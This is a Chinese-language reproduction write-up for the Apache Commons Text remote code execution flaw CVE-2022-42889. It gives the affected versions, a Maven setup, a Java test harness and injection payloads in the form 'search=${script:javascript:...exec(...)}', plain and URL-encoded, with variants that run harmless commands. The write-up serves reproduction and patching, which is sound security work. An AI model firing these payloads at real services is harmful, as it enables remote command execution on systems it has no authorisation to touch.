# Apache Commons Text 远程代码执行漏洞 CVE-2022-42889

## 漏洞描述

Apache Commons Text 项目实现了一系列关于文本字符串的算法，专注于处理字符串和文本块。10 月 13 日，Apache 发布安全公告，修复了 Apache Commons Text 中的一个远程代码执行漏洞（CVE-2022-42889）。Apache Commons Text 版本 1.5 到 1.9 中，由于不安全的插值默认值，当输入的参数不受信任时，可能导致远程代码执行。

## 漏洞影响

```
1.5.0 ≤ Apache Commons Text ＜ 1.10.0
```

## 环境搭建

IDEA 通过 Maven 导入依赖，pox.xml 如下：

```
<dependencies>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-configuration2</artifactId>
        <version>2.7</version>
    </dependency>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-text</artifactId>
        <version>1.9</version>
    </dependency>
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-lang3</artifactId>
        <version>3.12.0</version>
    </dependency>
</dependencies>
```

测试代码：

```
package org.text;

import org.apache.commons.text.StringSubstitutor;

public class Main {
    public static void main(String[] args) {
        StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
        // String payload = interpolator.replace("${script:js:new
        // java.lang.ProcessBuilder(\"calc\").start()}");
        String payload = "${script:js:new java.lang.ProcessBuilder(\"calc\").start()}";
        interpolator.replace(payload);
    }
}
```

## 漏洞复现

Payload：

```
search=${script:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}

url编码
search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27touch%20%2Ftmp%2Ffoo%27%29%7D

可以尝试
search=${url:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
search=${dns:javascript:java.lang.Runtime.getRuntime().exec('touch /tmp/foo')}
```

## 修复建议

官方已发布漏洞补丁及修复版本，请评估业务是否受影响后，酌情升级至安全版本。
